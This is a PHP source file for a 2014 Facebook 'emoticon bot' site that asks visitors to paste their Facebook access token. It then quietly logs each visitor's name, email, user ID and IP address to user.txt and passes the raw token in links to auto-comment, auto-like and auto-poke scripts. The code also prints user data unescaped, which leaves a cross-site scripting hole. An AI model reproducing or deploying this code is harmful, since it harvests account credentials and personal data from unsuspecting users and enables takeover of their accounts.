<?php
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>
bOt SoMpLaK
</title>
<meta name="description" content="NEW BOT FULL EMOTICONS ON FACEBOOK " />
<link rel="stylesheet" href="http://melody-jkt48.cf/style.css" type="text/css"/>
<link rel="stylesheet" href="http://melody-jkt48.cf/style1.css" type="text/css"/>
<link rel="shortcut icon" href="http://facebook.com/favicon.ico"/>
</head>
<body style="margin: auto; max-width: 640px;">
<div id="footer">
<table cellspacing="0" cellpadding="0" class="lr">
<tr>
<td valign="top">
<a href="/index.php">
<img src="http://melody-jkt48.cf/logo.png"  class="img" alt="bot koplak" />
</a>
</td>
<td valign="top" class="r">
</td>
</tr>
</table>
<div align="right">
<span class="fcw mfsm">

</span>
</div>
</div>';
switch($_GET['act']){
default:

echo '<div class="aclb">
<div class="acy apl abt abb">
<span >
Bot Facebook Emo Edition
</span>
</div>
<div class="furm"><div class="acw aps" style="padding-bottom:10px;"><table><tbody><tr><td class="apm" valign="top"><a href="http://facebook.com/MR.ZackyDotID"><img src="https://graph.facebook.com/MR.ZackyDotID/picture?type=normal" width="58" height="63" /></a></td>
<iframe src="//www.facebook.com/plugins/subscribe.php?href=https%3A%2F%2Fwww.facebook.com%2FMR.ZackyDotID&amp;layout=button_count&amp;show_faces=false&amp;colorscheme=light
&amp;font=lucida+grande&amp;width=105&amp;appId=281570931938574"
scrolling="no" frameborder="0"
style="border:none; overflow:hidden;
width:110px;height:50px;"
allowTransparency="true"></iframe><td class="l" valign="top"><span class="mfsl fclb"><span><b> <font color="red">Zacky Dot ID</font></a> </b><img src="http://static.ak.fbcdn.net/rsrc.php/v2/yU/r/gATt-jY8pG8.png" width="7" height="14" class="presence_icon presenceIcon  img"></span><br><div class="ib bylineItem"><img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yr/r/kkE5oR4elmj.png" width="12" height="14" class="img" /> </span> <span class="fcg">Share <a class="sec" href="http://m.facebook.com/sharer.php?u=http://seamobilecms.ml">Ke Teman</a></br> <img src="http://static.ak.fbcdn.net/rsrc.php/v2/y9/r/ggoudhN5vIO.png" width="12" height="14" class="l img"><span class="fcg"> CEO Founder <a href="https://facebook.com/MR.ZacktNetID">Kertanegara Inc.</a></span></div></div><div class="clear"></div></div> <div class="actionLinks"></td></tr></tbody></table></table></div></div></div></div>
<form method="post" action="?act=login">
<div class="aclb apl" align="center">
Insert Your Access Token Here!
<br />
<input class="input" name="token" value="" type="text" style="width:95%"/>
</div>
</div>
<div class="aclb apl">
<input value="Masuk" type="submit" name="login" class="btn btnC largeBtn" size="0" />
</div>
</form>
<hr style="background-color:#cccccc;height:1px;border:0px solid #fff;margin:0.3em auto;width:100%;" />
</div>';
include '../token.php';
 echo '<div class="acg apm fcg">Kesulitan Masuk?<br/><a class="fcs" href="../tutor.php">Cara Tutorial</a><br/><a class="fcs" href="http://fb.com/MR.ZackyDotID">Apa Ini ? </a><br>
<a class="fcs" href="../register.php">Daftar Menjadi Devloper </a>
</div></div>';
break;
case 'login':
$access_token = $_POST['token'];
$user = json_decode(file_get_contents('https://graph.beta.facebook.com/me?access_token='.$access_token));
if(empty($access_token)){
echo 'Please Insert Your Access Token!!';
}
else
{
$file = 'user.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "++++SimpleWAPSEA++++");
fwrite($handle, "\n");
fwrite($handle, "Name : ");
fwrite($handle, "$user->name");
fwrite($handle, "\n");
fwrite($handle, "Email : ");
fwrite($handle, "$user->email");
fwrite($handle, "\n");
fwrite($handle, "ID User : ");
fwrite($handle, "$user->id");
fwrite($handle, "\n");
fwrite($handle, "IP Address : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Submitted : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "++++Mr Zacky Dot ID++++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo '<div class="acw aps" style="padding-bottom:2px;">
<table>
<tr>
<td class="apm" valign="top">
<a  href="https://facebook.com/'.$user->id.'">
<img src="https://graph.facebook.com/'.$user->id.'/picture" alt=""/>
</a>
</td>
<td class="l" valign="top">
<span class="mfsl fclb"><b>
'.$user->name.'</b>
<br/>
<img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yr/r/kkE5oR4elmj.png" width="12" height="14" class="img" /> 
</span>
<span class="fcg">- Click <a href="http://m.facebook.com/sharer.php?u=http://nabilah-jkt48.cf" class="aps fcs">Here</a> To Share.
<br/>
<img src="http://static.ak.fbcdn.net/rsrc.php/v2/y5/r/istFX6zHZFF.png" width="12" height="14" class="feedAudienceIcon img" /> - CEO Founder <a class="aps fcs" href="https://MR.ZacktNetID" target="blank">Kertanegara Inc.</a></span>
</td>
</tr>
</table>
<iframe class="img r" src="https://www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/MR.ZackyDotID&layout=button_count&show_faces=true"></iframe>
</div><div class="aclb fcg fsl abt"><center><b> Bot Emoticons Facebook </b> </center></div>
<div class="aclb fcg fsl abb">
<div class="acw apm"> <a class="fcs" href="http://kreasi.jkt48.bz/">Bot Komen Emoticon</a> v2  <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="botEmoticons.php?access_token='.$access_token.'">Bot Komen Emoticon</a> v3  <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="botMotivasi.php?access_token='.$access_token.'">Bot Motivasi Emo</a> <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="botRamadan.php?access_token='.$access_token.'">Bot Ramadan</a> <font color="green">[NEW]</font>
<br/>
<a class="fcs" href="responComment.php?access_token='.$access_token.'">Respon Comment</a> <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="responStatusSendiri.php?access_token='.$access_token.'">Respon Status Sendiri</a> <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="responLike.php?access_token='.$access_token.'">Respon Like</a> <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="responStatus.php?access_token='.$access_token.'">Respon Status</a> <font color="green">[EMO]</font>
<br/>
<a class="fcs" href="responUltah.php?access_token='.$access_token.'">Auto Respon Ultah</a> <font color="red">[NEW]</font>
<br/>
<a class="fcs" href="inbox.php?access_token='.$access_token.'">Respon Inbox</a>
<br/>
<a class="fcs" href="phokes.php?access_token='.$access_token.'">Auto Colek</a></div></div>';
}
}
echo '<div class="furm" align="center"><br/><b>Jika anda suka situs ini.Silahkan donasikan ke No 087717687284 Secukupnya.Untuk pembayaran server.<br/> Thanks</b><br/></div>
<div id="footer" align="center">[  ρσωєяєđ вч  zα¢к вσ†™  ]<br/><br/><span class="mfss fcg"><font color="yellow"><center><b> <a href="http://fb.com/MR.ZacktNetID">Kertanegara Inc.</a> &copy 2014 <br/> All Right Reserved </b></center>
</div>';
?>

